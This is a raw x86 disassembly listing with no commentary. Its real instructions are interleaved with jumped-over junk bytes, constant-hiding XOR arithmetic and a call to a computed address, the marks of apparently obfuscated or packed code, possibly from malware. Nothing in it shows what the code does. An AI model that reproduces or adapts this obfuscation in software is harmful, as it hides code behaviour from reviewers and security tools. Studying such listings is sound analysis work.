  4021a9:	mov    eax,DWORD PTR [ebp-0x4]
  4021ac:	xor    eax,esi
  4021ae:	add    eax,ebx
  4021b0:	jmp    0x402c24
  4021b5:	mov    eax,DWORD PTR [ebp-0x2c]
  4021b8:	movzx  eax,WORD PTR [eax+edi*2]
  4021bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4021bf:	mov    eax,DWORD PTR [ecx+eax*4]
  4021c2:	jmp    0x402295
  4021c7:	lods   eax,DWORD PTR ds:[esi]
  4021c8:	adc    ah,BYTE PTR [edi+0x7d7da75f]
  4021ce:	jmp    0xb718:0xa7f835f7
  4021d5:	inc    ebx
  4021d6:	aad    0x96
  4021d8:	jbe    0x402256
  4021da:	jl     0x40217e
  4021dc:	jl     0x40225a
  4021de:	jl     0x4021c2
  4021e0:	adc    esi,0xffffffbe
  4021e3:	xor    BYTE PTR [eax+eiz*2],bl
  4021e6:	xor    eax,DWORD PTR [edx+edi*1+0x3fbfc0dc]
  4021ed:	adc    al,0x65
  4021ef:	adc    BYTE PTR [eax-0x698478fa],dl
  4021f5:	add    DWORD PTR [ebp-0x25511e81],esp
  4021fb:	and    dh,BYTE PTR [esi-0xd]
  4021fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021ff:	pop    esi
  402200:	or     ch,BYTE PTR [esi+0x2afd737]
  402206:	sbb    dh,ch
  402208:	hlt    
  402209:	mov    bh,0x69
  40220b:	push   esp
  40220c:	or     sp,WORD PTR [esi]
  40220f:	cmp    ebp,DWORD PTR [esi-0x4d38bc11]
  402215:	repnz sahf 
  402217:	outs   dx,DWORD PTR ds:[esi]
  402218:	mov    ds:0xf77e5004,eax
  40221d:	sbb    BYTE PTR [esi+0x6cbbb0a8],0x65
  402224:	fild   WORD PTR [edx+0x2b]
  402227:	jns    0x402248
  402229:	adc    eax,0x5e3e4d4f
  40222e:	fwait
  40222f:	xchg   esi,eax
  402230:	addr16 sub eax,0x18066422
  402236:	into   
  402237:	push   cs
  402238:	inc    esp
  402239:	push   ecx
  40223a:	std    
  40223b:	and    al,cl
  40223d:	(bad)  
  40223e:	mov    ebx,0xf5ef3f5d
  402243:	jg     0x40220b
  402245:	or     BYTE PTR [ebx],bl
  402247:	jbe    0x40226b
  402249:	push   ebx
  40224a:	pop    ebx
  40224b:	sub    DWORD PTR [esi+0x44],esi
  40224e:	dec    ebp
  40224f:	mov    eax,ds:0x668967e5
  402254:	int    0x10
  402256:	adc    BYTE PTR [edi],al
  402258:	add    eax,0x692d95de
  40225d:	pusha  
  40225e:	stos   DWORD PTR es:[edi],eax
  40225f:	arpl   WORD PTR [edi-0x5d01c587],bx
  402265:	or     BYTE PTR [ebp-0x39],bh
  402268:	bndldx (bad),[ecx+0x7a]
  40226c:	sbb    BYTE PTR [eax],al
  40226e:	int    0x67
  402270:	cmp    edi,DWORD PTR [ebx-0x3d]
  402273:	pop    ss
  402274:	jmp    0x4498:0xb223e402
  40227b:	cmp    ebp,DWORD PTR [esi+0x2c6413ea]
  402281:	sbb    eax,0xba7a72cc
  402286:	or     eax,0x58aaf117
  40228b:	pop    ecx
  40228c:	repnz mov al,0xb2
  40228f:	sub    eax,0x6e342829
  402294:	lahf   
  402295:	mov    DWORD PTR [ebp+0xc],eax
  402298:	mov    eax,DWORD PTR [ebp-0x4]
  40229b:	mov    ecx,DWORD PTR [ebp-0x8]
  40229e:	jmp    0x402371
  4022a3:	xchg   ebx,eax
  4022a4:	sub    al,BYTE PTR [esp+eax*1]
  4022a7:	cdq    
  4022a8:	cmp    dl,BYTE PTR [ebx+0x426f4fbd]
  4022ae:	mov    dh,0x0
  4022b0:	pop    eax
  4022b1:	dec    edi
  4022b2:	inc    edi
  4022b3:	fmul   QWORD PTR [ecx]
  4022b5:	jl     0x402333
  4022b7:	mov    ds:0x7b7c7c7c,al
  4022bc:	or     BYTE PTR [edi+0x111183e6],dh
  4022c2:	mov    bl,0xa
  4022c4:	in     eax,dx
  4022c5:	push   0xc1e7a8a
  4022ca:	push   ebp
  4022cb:	ins    DWORD PTR es:[edi],dx
  4022cc:	add    bh,BYTE PTR [ebx]
  4022ce:	sub    al,dh
  4022d0:	mov    cl,0x25
  4022d2:	mov    ecx,0x2440e3a8
  4022d7:	je     0x402329
  4022d9:	sbb    eax,DWORD PTR [ebx+edx*8]
  4022dc:	jecxz  0x4022cf
  4022de:	cld    
  4022df:	ins    BYTE PTR es:[edi],dx
  4022e0:	dec    ebx
  4022e1:	sar    BYTE PTR [eax],1
  4022e3:	(bad)  
  4022e4:	add    DWORD PTR [esi],eax
  4022e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022e7:	popf   
  4022e8:	jecxz  0x402286
  4022ea:	ins    DWORD PTR es:[edi],dx
  4022eb:	(bad)  
  4022ed:	icebp  
  4022ee:	retf   
  4022ef:	inc    esp
  4022f0:	ja     0x40228b
  4022f2:	jmp    0x402285
  4022f4:	mov    ds:0x9c4916d0,al
  4022f9:	rcl    edi,cl
  4022fb:	xor    DWORD PTR [ecx+0x376a64db],ebx
  402301:	int    0xe4
  402303:	rol    DWORD PTR [ebx+0x35],0x32
  402307:	clc    
  402308:	in     al,0x48
  40230a:	jge    0x4022b5
  40230c:	adc    ch,BYTE PTR [ebx+ebp*1-0x63]
  402310:	sbb    eax,0xba131f8b
  402315:	lods   eax,DWORD PTR ds:[esi]
  402316:	mov    esi,0x7906db77
  40231b:	enter  0x4fbd,0x3e
  40231f:	clc    
  402320:	lds    esi,FWORD PTR [ecx+0x6f5ae6d6]
  402326:	mov    edi,0xd6d14897
  40232b:	fbstp  TBYTE PTR [esi+0x5a0b83fd]
  402331:	mov    dl,0x54
  402333:	pop    esp
  402334:	xchg   edx,eax
  402335:	repnz inc edi
  402337:	mov    ecx,0x49cc3646
  40233c:	jg     0x402374
  40233e:	mov    edx,0x956e8093
  402343:	pop    ebp
  402344:	pop    es
  402345:	stc    
  402346:	(bad)  [esi+0x7ffbcf2c]
  40234c:	jg     0x40234b
  40234e:	or     DWORD PTR [eax+0x12eb7f4a],ecx
  402354:	sbb    BYTE PTR [eax+eax*2+0xbefc1a0],0xd3
  40235c:	adc    DWORD PTR es:[esi],ebp
  40235f:	gs jmp 0x59f01476
  402365:	sub    al,0xd5
  402367:	push   esp
  402368:	in     al,0x8a
  40236a:	cmp    ebp,DWORD PTR [ebp-0x5779dea0]
  402370:	cmp    eax,0x51085735
  402375:	pop    es
  402376:	add    eax,ebx
  402378:	cmp    ecx,eax
  40237a:	jne    0x40238d
  402380:	mov    eax,DWORD PTR [ebp-0x4]
  402383:	xor    eax,0x7510857
  402388:	jmp    0x4021ae
  40238d:	mov    eax,DWORD PTR [ebp+0xc]
  402390:	add    eax,DWORD PTR [ebp+0x8]
  402393:	mov    DWORD PTR [ebp-0x10],eax
  402396:	mov    eax,DWORD PTR [ebp-0x1c]
  402399:	test   eax,eax
  40239b:	je     0x4026e4
  4023a1:	mov    DWORD PTR [ebp-0x24],esi
  4023a4:	push   0xb
  4023a6:	pop    ecx
  4023a7:	push   0x5
  4023a9:	dec    ecx
  4023aa:	pop    ebx
  4023ab:	xchg   ebx,ecx
  4023ad:	sub    ebx,ecx
  4023af:	xchg   ebx,ecx
  4023b1:	dec    ecx
  4023b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4023b5:	imul   eax,ecx
  4023b8:	sub    esp,eax
  4023ba:	mov    DWORD PTR [ebp-0x24],esp
  4023bd:	mov    eax,DWORD PTR [ebp-0x4]
  4023c0:	mov    ecx,0x7510857
  4023c5:	xor    eax,ecx
  4023c7:	mov    edx,0x32729e
  4023cc:	add    eax,edx
  4023ce:	mov    DWORD PTR [ebp+0x8],eax
  4023d1:	jmp    0x4024a4
  4023d6:	cmp    dl,BYTE PTR [esi+0x7b653be5]
  4023dc:	cli    
  4023dd:	test   eax,0x3babd173
  4023e2:	and    al,0x72
  4023e4:	sbb    dh,bl
  4023e6:	add    cl,BYTE PTR [eax]
  4023e8:	jl     0x402466
  4023ea:	mov    ds:0xbc7c7c7c,al
  4023ef:	sahf   
  4023f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023f1:	js     0x402449
  4023f3:	popa   
  4023f4:	jae    0x4023a0
  4023f6:	and    DWORD PTR [edi-0x79],esi
  4023f9:	cwde   
  4023fa:	rcl    DWORD PTR [ebx],cl
  4023fc:	lods   al,BYTE PTR ds:[esi]
  4023fd:	je     0x402416
  4023ff:	ins    DWORD PTR es:[edi],dx
  402400:	data16 lods al,BYTE PTR ds:[esi]
  402402:	jmp    0x4ec5edb3
  402407:	inc    ebx
  402408:	inc    ecx
  402409:	sbb    al,0x71
  40240b:	imul   edi,DWORD PTR [edi-0x71],0x80d750b2
  402412:	cmp    ch,BYTE PTR [eax]
  402414:	arpl   WORD PTR [ebx+0x40],si
  402417:	jge    0x40240e
  402419:	in     eax,dx
  40241a:	mov    dl,0x62
  40241c:	rcr    DWORD PTR [esi+ebp*1+0x0],0xc6
  402421:	push   esi
  402422:	out    0x84,eax
  402424:	loopne 0x40244b
  402426:	pop    eax
  402427:	iret   
  402428:	out    0xe9,eax
  40242a:	xchg   BYTE PTR [ecx-0x6b727c09],al
  402430:	adc    esp,DWORD PTR [eax+0x5a]
  402433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402434:	daa    
  402435:	ror    DWORD PTR [ecx+0x4de5f6c3],1
  40243b:	mov    cl,0x5d
  40243d:	jbe    0x402442
  40243f:	jo     0x4023c9
  402441:	or     BYTE PTR [ebx],bl
  402443:	out    dx,al
  402444:	mov    BYTE PTR [ecx],ah
  402446:	or     DWORD PTR [esi],ebx
  402448:	test   eax,0x5e8236a5
  40244d:	fmul   QWORD PTR [esp+ebp*4-0x3c70ed0e]
  402454:	pop    esp
  402455:	lea    edx,[eax+eiz*2-0x51]
  402459:	xchg   ecx,eax
  40245a:	cwde   
  40245b:	int3   
  40245c:	mov    ecx,0x6c237c39
  402461:	outs   dx,DWORD PTR ds:[esi]
  402462:	je     0x4024db
  402464:	cwde   
  402465:	cmp    eax,0x21db4aff
  40246a:	int    0x5b
  40246c:	jp     0x402456
  40246e:	jmp    0x402435
  402470:	(bad)  
  402471:	fprem  
  402473:	xchg   esp,eax
  402474:	push   eax
  402475:	fcmove st,st(4)
  402477:	mov    dh,0x88
  402479:	or     bl,BYTE PTR [eax+0x2]
  40247c:	inc    edx
  40247d:	repz xchg edx,eax
  40247f:	(bad)  
  402480:	inc    ebp
  402481:	dec    edi
  402482:	in     al,dx
  402483:	es (bad) 
  402486:	fldenv [esi]
  402488:	xor    eax,0x50fd9bc5
  40248d:	aad    0xde
  40248f:	pop    edi
  402490:	jge    0x4024a9
  402492:	mov    DWORD PTR [esi],ebx
  402494:	or     eax,0x21ee67b
  402499:	fcomp  DWORD PTR [ecx]
  40249b:	retf   0x9cf5
  40249e:	xchg   ebp,eax
  40249f:	adc    eax,0x44ad40b4
  4024a4:	mov    eax,DWORD PTR [ebp-0x18]
  4024a7:	xor    eax,ecx
  4024a9:	add    eax,edx
  4024ab:	mov    edx,DWORD PTR [ebp+0x14]
  4024ae:	jmp    0x402581
  4024b3:	and    al,0x81
  4024b5:	rep ins BYTE PTR es:[edi],dx
  4024b7:	lods   eax,DWORD PTR ds:[esi]
  4024b8:	(bad)  
  4024b9:	sti    
  4024ba:	pop    ecx
  4024bb:	xor    DWORD PTR [ebx],0x1e3bbfae
  4024c1:	inc    eax
  4024c2:	inc    edi
  4024c3:	dec    eax
  4024c4:	or     BYTE PTR [esp+edi*2-0x5e],bh
  4024c8:	jl     0x402546
  4024ca:	jl     0x4024eb
  4024cc:	adc    ebx,DWORD PTR [edi]
  4024ce:	sub    al,0xea
  4024d0:	mov    ecx,0x3221daf5
  4024d5:	retf   
  4024d6:	pop    edx
  4024d7:	test   DWORD PTR [ebp-0x79478c2c],esp
  4024dd:	push   0x3b
  4024df:	or     ebx,DWORD PTR [ebx-0x23dc4437]
  4024e5:	jno    0x4024b8
  4024e7:	fnstsw WORD PTR [eax]
  4024e9:	mov    edx,0xdec8b64c
  4024ee:	call   0xcb6e3135
  4024f3:	ret    0xabed
  4024f6:	mov    esi,0x41303c67
  4024fb:	lods   al,BYTE PTR ds:[esi]
  4024fc:	js     0x4024a0
  4024fe:	adc    esp,DWORD PTR [ecx+0x27]
  402501:	int3   
  402502:	or     al,BYTE PTR [edi-0x25]
  402505:	xor    cl,BYTE PTR gs:[edx-0x28ad5a41]
  40250c:	add    ecx,edx
  40250e:	mov    al,0xc1
  402510:	jne    0x40258c
  402512:	jne    0x402556
  402514:	les    ecx,FWORD PTR [ebp-0x21]
  402517:	adc    BYTE PTR [ebp-0x2539d33],0xab
  40251e:	mov    ebx,0x5a25a5a4
  402523:	dec    esp
  402524:	sub    al,0x63
  402526:	test   ah,dl
  402528:	scas   eax,DWORD PTR es:[edi]
  402529:	jb     0x4024b6
  40252b:	popa   
  40252c:	dec    edi
  40252d:	xor    al,0x4c
  40252f:	xor    DWORD PTR [ebp+edx*8+0x465ef024],eax
  402536:	jl     0x4024cf
  402538:	push   ebx
  402539:	add    esp,DWORD PTR [ebp-0x4e4a0219]
  40253f:	sar    dh,cl
  402541:	mov    es,esp
  402543:	sbb    al,0x43
  402545:	inc    edi
  402546:	in     eax,0x97
  402548:	mov    DWORD PTR [ecx],0x9d772e5d
  40254e:	push   ebx
  40254f:	ror    cl,1
  402551:	repz (bad) 
  402553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402554:	scas   eax,DWORD PTR es:[edi]
  402555:	mov    al,ds:0xfa003b95
  40255a:	sbb    dh,dl
  40255c:	js     0x4025c8
  40255e:	popw   ss
  402560:	jmp    0x402558
  402562:	xor    ch,BYTE PTR [ebx]
  402564:	jbe    0x4025cf
  402566:	in     eax,dx
  402567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402568:	adc    BYTE PTR [esi+0x75],cl
  40256b:	xchg   edx,eax
  40256c:	add    DWORD PTR [edi-0x71],edi
  40256f:	add    bl,BYTE PTR [ebx]
  402571:	jnp    0x40252c
  402573:	pop    es
  402574:	mov    dl,0x42
  402576:	fidiv  DWORD PTR [ebx]
  402578:	cdq    
  402579:	nop
  40257a:	mov    esi,0x2b14f7d7
  40257f:	test   eax,0x2af0f08
  402584:	mov    edx,DWORD PTR [ebp-0x4]
  402587:	xor    edx,ecx
  402589:	mov    ecx,DWORD PTR [ebp+0x8]
  40258c:	lea    ecx,[edx+ecx*1+0x32729e]
  402593:	cmp    ecx,eax
  402595:	je     0x4026df
  40259b:	mov    edi,DWORD PTR [ebp-0x18]
  40259e:	mov    eax,DWORD PTR [ebp+0x8]
  4025a1:	mov    edx,DWORD PTR [ebp+0x14]
  4025a4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4025a8:	mov    ecx,0x7510857
  4025ad:	xor    edx,edx
  4025af:	xor    edi,ecx
  4025b1:	mov    esi,0x32729e
  4025b6:	add    edi,esi
  4025b8:	div    edi
  4025ba:	mov    edx,DWORD PTR [ebp-0x4]
  4025bd:	xor    edx,ecx
  4025bf:	lea    eax,[edx+eax*1+0x32729e]
  4025c6:	mov    edx,DWORD PTR [ebp+0x8]
  4025c9:	mov    edi,DWORD PTR [ebp-0x24]
  4025cc:	mov    DWORD PTR [edi+edx*4],eax
  4025cf:	mov    eax,DWORD PTR [ebp-0x18]
  4025d2:	mov    edx,DWORD PTR [ebp+0x8]
  4025d5:	xor    eax,ecx
  4025d7:	lea    eax,[eax+edx*1+0x32729e]
  4025de:	mov    DWORD PTR [ebp+0x8],eax
  4025e1:	mov    eax,DWORD PTR [ebp-0x18]
  4025e4:	mov    edx,DWORD PTR [ebp+0x14]
  4025e7:	xor    eax,ecx
  4025e9:	add    eax,esi
  4025eb:	imul   eax,DWORD PTR [edx]
  4025ee:	mov    edx,DWORD PTR [ebp-0x4]
  4025f1:	xor    edx,ecx
  4025f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4025f6:	lea    ecx,[edx+ecx*1+0x32729e]
  4025fd:	cmp    ecx,eax
  4025ff:	jne    0x40259b
  402605:	jmp    0x4026d8
  40260a:	xlat   BYTE PTR ds:[ebx]
  40260b:	pop    esp
  40260c:	cmp    DWORD PTR [eax-0x47],eax
  40260f:	pop    ebp
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	jnp    0x4025e8
  402613:	sbb    ch,bl
  402615:	mov    DWORD PTR [ebp-0x181b2f6],edx
  40261b:	or     edi,DWORD PTR [esp+edi*2-0x5e]
  40261f:	jl     0x40269d
  402621:	jl     0x402644
  402623:	jg     0x40263d
  402625:	aad    0xc2
  402627:	repnz mov al,0x49
  40262a:	das    
  40262b:	mov    al,0xa
  40262d:	shl    BYTE PTR [eax-0x7ea894c0],cl
  402633:	adc    al,0x15
  402635:	cmp    DWORD PTR [esi],edx
  402637:	ss push es
  402639:	or     bh,BYTE PTR cs:[ecx+eax*8]
  40263d:	ss mov esp,0x904fbf83
  402643:	inc    edi
  402644:	adc    bl,BYTE PTR [edx-0x129e78e9]
  40264a:	sub    eax,ebx
  40264c:	lock bound ebp,QWORD PTR [edi+0x2b4622c5]
  402653:	and    ch,BYTE PTR [ecx-0x429d8679]
  402659:	add    eax,0xc5fd59d3
  40265e:	sbb    al,0x53
  402660:	mov    ah,0x27
  402662:	shl    DWORD PTR [ebx],1
  402664:	es sub eax,0xda68879e
  40266a:	xchg   esp,eax
  40266b:	and    cl,dh
  40266d:	test   BYTE PTR [esi],0x44
  402670:	cs xchg edi,eax
  402672:	mov    ch,0xb3
  402674:	mov    ebp,0x5e6ee787
  402679:	sbb    edi,DWORD PTR [edx]
  40267b:	add    ah,BYTE PTR [ebp-0x317a2efd]
  402681:	mov    bh,0xad
  402683:	fbld   TBYTE PTR [esi-0x365e7377]
  402689:	and    ch,BYTE PTR [ebx]
  40268b:	sahf   
  40268c:	loopne 0x402655
  40268e:	inc    eax
  40268f:	pop    eax
  402690:	es dec ebx
  402692:	neg    BYTE PTR [ecx-0x9]
  402695:	in     al,dx
  402696:	ds inc ebp
  402698:	add    eax,0x1d2e0601
  40269d:	cmp    dl,BYTE PTR ds:0xcb90b88a
  4026a3:	jecxz  0x4026ed
  4026a5:	fwait
  4026a6:	inc    eax
  4026a7:	and    eax,0x5e741122
  4026ac:	pusha  
  4026ad:	(bad)  
  4026ae:	enter  0x8844,0x8b
  4026b2:	in     eax,0x3f
  4026b4:	lea    edx,[edi+0xf]
  4026b7:	aaa    
  4026b8:	lea    ebp,[ecx+eiz*8]
  4026bb:	sbb    dh,BYTE PTR [ecx-0x5a60628a]
  4026c1:	or     ah,bh
  4026c3:	xchg   esi,eax
  4026c4:	sbb    BYTE PTR [edx+0xbd181ed],bh
  4026ca:	cld    
  4026cb:	jecxz  0x4026ea
  4026cd:	add    al,BYTE PTR [eax]
  4026cf:	add    BYTE PTR [ecx-0x74],dl
  4026d2:	(bad)  [edx+0x54]
  4026d5:	jle    0x4026ff
  4026d7:	add    cl,BYTE PTR [ebx+0x5e9de]
  4026dd:	add    BYTE PTR [eax],al
  4026df:	mov    ebx,0x32729e
  4026e4:	mov    eax,DWORD PTR [ebp-0x4]
  4026e7:	xor    eax,0x7510857
  4026ec:	jmp    0x4027bf
  4026f1:	(bad)  
  4026f2:	fsubr  st(2),st
  4026f4:	mov    esp,0x647a42fa
  4026f9:	clc    
  4026fa:	(bad)  
  4026fb:	mov    WORD PTR [ecx-0x6f],?
  4026fe:	sbb    ebx,DWORD PTR [ebx+0x1a]
  402701:	and    al,0xa
  402703:	jl     0x402781
  402705:	mov    ds:0xf07c7c7c,al
  40270a:	xor    ebp,DWORD PTR [ebp-0x6143057e]
  402710:	xchg   ebx,eax
  402711:	popf   
  402712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402713:	dec    edx
  402714:	das    
  402715:	xchg   ebp,eax
  402716:	pop    ds
  402717:	and    BYTE PTR [esi+ebp*8],bl
  40271a:	push   0xffffffee
  40271c:	inc    ebx
  40271d:	mov    BYTE PTR [ecx+0x2ef29ea2],bl
  402723:	shr    BYTE PTR [ecx-0x27506887],cl
  402729:	push   es
  40272a:	and    edx,DWORD PTR [ebp+0x32d72a84]
  402730:	sub    eax,0x715f47cc
  402735:	cmp    al,0x15
  402737:	sub    BYTE PTR [edi+0x10],0x91
  40273b:	not    BYTE PTR [ebx-0x6fe2a77]
  402741:	add    ch,BYTE PTR [eax+0x4cbcdef5]
  402747:	jl     0x40276b
  402749:	mov    ah,0x98
  40274b:	icebp  
  40274c:	iret   
  40274d:	xchg   esi,eax
  40274e:	fwait
  40274f:	mov    al,ds:0xe75e18eb
  402754:	out    dx,eax
  402755:	mov    edx,0x782b712e
  40275a:	or     eax,ecx
  40275c:	inc    ecx
  40275d:	mov    ecx,0x134a589f
  402762:	(bad)  
  402763:	lahf   
  402764:	push   cs
  402765:	mov    esi,DWORD PTR [eax+0x436a6c45]
  40276b:	dec    edi
  40276c:	push   edi
  40276d:	stos   DWORD PTR es:[edi],eax
  40276e:	add    eax,0x2284022a
  402773:	cli    
  402774:	loope  0x402752
  402776:	mov    ah,0xc1
  402778:	mov    ebx,0x29e0fe7f
  40277d:	retf   0x4fb
  402780:	rcl    BYTE PTR [ebp+0xa],0x3a
  402784:	jns    0x4027e8
  402786:	push   ebp
  402787:	stc    
  402788:	repnz pop edx
  40278a:	(bad)
  40278d:	lods   al,BYTE PTR ds:[esi]
  40278e:	retf   0xd90e
  402791:	jecxz  0x40276a
  402793:	cmp    BYTE PTR [edx-0x5c],ah
  402796:	cmp    al,0x7f
  402798:	push   0x78b9af7f
  40279d:	nop
  40279e:	shl    BYTE PTR [eax],0x38
  4027a1:	jb     0x4027ea
  4027a3:	in     al,dx
  4027a4:	xchg   DWORD PTR [edi+0xb],ecx
  4027a7:	mov    dl,0xe1
  4027a9:	or     ebp,edx
  4027ab:	jge    0x4027e4
  4027ad:	fadd   QWORD PTR [ebp+0x17]
  4027b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027b1:	adc    BYTE PTR [esi-0x45a2547f],0xa8
  4027b8:	jmp    0x600f3746
  4027bd:	imul   ebx,DWORD PTR [edi+0x4589c303],0xfffffff4
  4027c4:	jmp    0x402897
  4027c9:	pop    ebp
  4027ca:	fimul  WORD PTR [ebp+eiz*8+0x567d65bb]
  4027d1:	cdq    
  4027d2:	push   es
  4027d3:	mov    si,0x1ce3
  4027d7:	mov    ch,0x10
  4027d9:	push   0xa
  4027db:	jl     0x402859
  4027dd:	mov    ds:0x9e7c7c7c,al
  4027e2:	je     0x4027e0
  4027e4:	das    
  4027e5:	loop   0x402802
  4027e7:	push   ecx
  4027e8:	pop    ds
  4027e9:	retf   
  4027ea:	add    al,0x94
  4027ec:	pushf  
  4027ed:	pop    ebx
  4027ee:	ins    BYTE PTR es:[edi],dx
  4027ef:	push   esi
  4027f0:	sar    DWORD PTR ds:0x37d771ad,0xb9
  4027f7:	push   0x6f
  4027f9:	jl     0x4027bf
  4027fb:	push   ebx
  4027fc:	fld    DWORD PTR [edi-0x69]
  4027ff:	lahf   
  402800:	stc    
  402801:	xchg   esi,eax
  402802:	fldcw  WORD PTR [esi-0x70]
  402805:	outs   dx,DWORD PTR ds:[esi]
  402806:	jae    0x4027d8
  402808:	push   edx
  402809:	sub    eax,0xacc8f98d
  40280e:	xchg   ebp,eax
  40280f:	mov    al,0xc9
  402811:	cmp    DWORD PTR [ecx],ebp
  402813:	adc    al,0xf3
  402815:	clc    
  402816:	rep lods eax,DWORD PTR ds:[esi]
  402818:	pop    es
  402819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40281a:	inc    ebx
  40281b:	jl     0x402895
  40281d:	dec    ebx
  40281e:	sbb    al,0x88
  402820:	push   cs
  402821:	fnstcw WORD PTR [edx]
  402823:	xor    eax,0xe7afe897
  402828:	ret    0x1081
  40282b:	imul   eax,DWORD PTR [edi],0xfb950d76
  402831:	fist   DWORD PTR [edi]
  402833:	sbb    BYTE PTR [esi],0x2
  402836:	pop    esp
  402837:	daa    
  402838:	sar    DWORD PTR [eax+0x2e],0x82
  40283c:	ins    BYTE PTR es:[edi],dx
  40283d:	xor    DWORD PTR [eax],edi
  40283f:	fwait
  402840:	int    0xbd
  402842:	pushf  
  402843:	jge    0x402839
  402845:	adc    eax,0xb748e271
  40284a:	lds    edi,FWORD PTR [ecx]
  40284c:	(bad)  
  40284e:	in     al,0xa3
  402850:	inc    esi
  402851:	adc    eax,0xbabf25c9
  402856:	mov    esp,0x4f1c197e
  40285b:	jmp    0x2719074e
  402860:	imul   ecx,esp,0x7e
  402863:	push   ecx
  402864:	add    al,0x10
  402866:	aad    0xb8
  402868:	js     0x402816
  40286a:	aam    0xe
  40286c:	sar    BYTE PTR [ebx-0x4b],0xbb
  402870:	sti    
  402871:	retf   0x2e73
  402874:	push   edi
  402875:	mov    ah,0x29
  402877:	jbe    0x402881
  402879:	jbe    0x4028eb
  40287b:	add    eax,0x7b9450f0
  402880:	imul   DWORD PTR [edi-0x6eada8d8]
  402886:	sub    edx,eax
  402888:	mov    bh,0xd
  40288a:	jmp    0xd143:0x1690a1b2
  402891:	inc    ebx
  402892:	lods   al,BYTE PTR ds:[esi]
  402893:	rol    BYTE PTR [edi],1
  402895:	rcr    ebp,1
  402897:	xor    ebx,ebx
  402899:	lea    eax,[ebp-0x10]
  40289c:	add    ebx,DWORD PTR [eax]
  40289e:	call   ebx
  4028a0:	xor    ebx,ebx
  4028a2:	inc    ebx
  4028a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4028a6:	jmp    0x402979
  4028ab:	jmp    0x4028ef
  4028ad:	inc    esp
  4028ae:	ins    BYTE PTR es:[edi],dx
  4028af:	jns    0x40292b
  4028b1:	jmp    0x402910
  4028b3:	loope  0x40292e
  4028b5:	pushf  
  4028b6:	and    BYTE PTR [ebx],0x27
  4028b9:	fwait
  4028ba:	adc    eax,0x7c7c0d90
  4028bf:	mov    ds:0xa77c7c7c,al
  4028c4:	pop    es
  4028c5:	cmp    bh,BYTE PTR [edx+0x5c]
  4028c8:	sub    cl,dl
  4028ca:	aam    0xf8
  4028cc:	pop    ecx
  4028cd:	push   edi
  4028ce:	push   0x33
  4028d0:	dec    ecx
  4028d1:	rol    BYTE PTR [ebp+0xb],1
  4028d4:	xor    al,BYTE PTR [ecx-0x17]
  4028d7:	pop    esi
  4028d8:	aad    0x2
  4028da:	inc    ebx
  4028db:	sahf   
  4028dc:	xlat   BYTE PTR ds:[ebx]
  4028dd:	dec    edx
  4028de:	xor    eax,esi
  4028e0:	fisub  DWORD PTR [esp+edi*1+0x46a5153c]
  4028e7:	dec    ebx
  4028e8:	hlt    
  4028e9:	ins    DWORD PTR es:[edi],dx
  4028ea:	je     0x402933
  4028ec:	out    0xe4,eax
  4028ee:	hlt    
  4028ef:	icebp  
  4028f0:	mov    ecx,0x53599d88
  4028f5:	xor    cl,bl
  4028f7:	xor    BYTE PTR [eax-0x44],dl
  4028fa:	arpl   WORD PTR [ecx],cx
  4028fc:	rol    BYTE PTR [ebx+0x448df67f],cl
  402902:	jmp    0x4d4deb60
  402907:	mov    dl,0x4c
  402909:	repz aad 0x2c
  40290c:	mov    dl,0x8a
  40290e:	nop
  40290f:	adc    al,0x1b
  402911:	outs   dx,DWORD PTR ds:[esi]
  402912:	or     esp,DWORD PTR [ebp-0x44]
  402915:	cmp    BYTE PTR [ebp-0x535e65f5],0x99
  40291c:	or     esp,DWORD PTR [ebx]
  40291e:	cld    
  40291f:	mov    eax,0xcfcedfa9
  402924:	loope  0x402995
  402926:	repz mov bh,0x1c
  402929:	jge    0x4028d1
  40292b:	cmp    esi,esp
  40292d:	mov    DWORD PTR [edx+0x427aa622],ebx
  402933:	aaa    
  402934:	imul   eax,DWORD PTR [edx+0x2c7b78cb],0x3a21cd8a
  40293e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40293f:	pop    edx
  402940:	nop
  402941:	sahf   
  402942:	fdivr  QWORD PTR [edx+0x21]
  402945:	push   ds
  402946:	out    0xa8,al
  402948:	mov    eax,ds:0x416e5ff4
  40294d:	(bad)
  402950:	lahf   
  402951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402952:	adc    edi,DWORD PTR [ebp-0x7adb2807]
  402958:	popa   
  402959:	mov    ecx,0xcf490511
  40295e:	(bad)  
  40295f:	loopne 0x402938
  402961:	and    eax,esp
  402963:	xchg   BYTE PTR [ecx-0x1b],bl
  402966:	mov    ah,0xf2
  402968:	pop    ebx
  402969:	call   0x577114f2
  40296e:	outs   dx,DWORD PTR ds:[esi]
  40296f:	push   es
  402970:	xchg   ecx,eax
  402971:	repnz sub DWORD PTR [esi+0x2d],esi
  402975:	mov    edx,0xff4ca2f
  40297a:	test   BYTE PTR [eax],bl
  40297c:	add    BYTE PTR [eax],al
  40297e:	add    BYTE PTR [edx+0x6a590a6a],dl
  402984:	add    al,0x5b
  402986:	inc    ebx
  402987:	xchg   ebx,ecx
  402989:	sub    ebx,ecx
  40298b:	xchg   ebx,ecx
  40298d:	dec    ecx
  40298e:	mov    eax,DWORD PTR [ebp-0x1c]
  402991:	imul   eax,ecx
  402994:	add    esp,eax
  402996:	xchg   edx,eax
  402997:	push   eax
  402998:	xor    ebx,ebx
  40299a:	mov    edx,esp
  40299c:	jmp    0x402a6f
  4029a1:	jns    0x4029c0
  4029a3:	inc    ebp
  4029a4:	ds gs mov dh,0x7d
  4029a8:	mov    ebp,0x6beb4b4b
  4029ad:	xchg   esi,eax
  4029ae:	add    cl,0x2c
  4029b1:	(bad)  
  4029b2:	or     al,0x7c
  4029b4:	jl     0x402958
